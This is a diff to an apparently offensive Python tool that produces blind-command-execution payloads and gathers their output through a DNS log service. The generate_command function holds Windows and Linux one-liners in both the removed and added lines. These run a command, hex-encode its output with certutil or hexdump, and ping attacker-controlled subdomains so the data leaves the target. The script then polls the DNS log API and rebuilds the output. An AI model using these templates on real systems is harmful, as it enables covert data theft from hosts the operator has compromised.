@@ -7,6 +7,7 @@ import binascii
 import datetime
 import pytz
 import requests
+import re
 from tzlocal import get_localzone
 
 # author: 617sec //https://github.com/Dr-S1x17
@@ -53,15 +54,17 @@ def get_config():
     lastRecordLen = 0
     finishOnce = False
 
+
 def generate_command():
-    commandTemWin = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0}'
-    commandTemLinux = r'rm -f command7;rm -f command7.txt;command > command7 &&echo 11111111111 >>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'
+    commandTemWin = r'del execfile7 && del execfile7.txt && command > execfile7 &&echo 11111111111>>execfile7 && certutil -encodehex execfile7 execfile7.txt && for /f "tokens=1-17" %a in (execfile7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.execfile.{0}'
+    commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|hexdump -C > execfile7.txt && cat execfile7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
     commandWin = commandTemWin.format(dnsurl)
     commandLinux = commandTemLinux.format(dnsurl)
+    execfilename = ''.join(re.findall(r'[A-Za-z]', command)) 
     print("Windows:\n")
-    print(commandWin.replace('command',command))
+    print(commandWin.replace('command',command).replace('execfile', execfilename))
     print("\nLinux:\n")
-    print(commandLinux.replace('command',command))
+    print(commandLinux.replace('command',command).replace('execfile', execfilename))
 
 
 def generate_code(code_len=4):
@@ -123,7 +126,8 @@ def get_ds_dnslogdata() -> list:
         for length in range(commandStartPos,-1,-1):
             if result[length-1][1]['time'] < lastFinishTime:break
             if result[length-1][1]['subdomain'].count('.') == count_counts:
-                tempList.append(result[length-1][1]['subdomain']) 
+                if not result[length-1][1]['subdomain'].find("_") != -1:
+                    tempList.append(result[length-1][1]['subdomain']) 
         commandHex[commandName].extend(tempList)
         return commandHex[commandName]
 
@@ -306,7 +310,7 @@ if __name__ == "__main__":
             else:
                 url = domain_server + '/' +token
             #proxies = { 'http':'http://127.0.0.1:8080' }
-            result = json.loads(requests.get(url, proxies=False, verify=False).text)
+            result = json.loads(requests.get(url, proxies=False, verify=False).text.lower())
             if args.domain_server == None:
                 result = result['data']
                 if result == []:
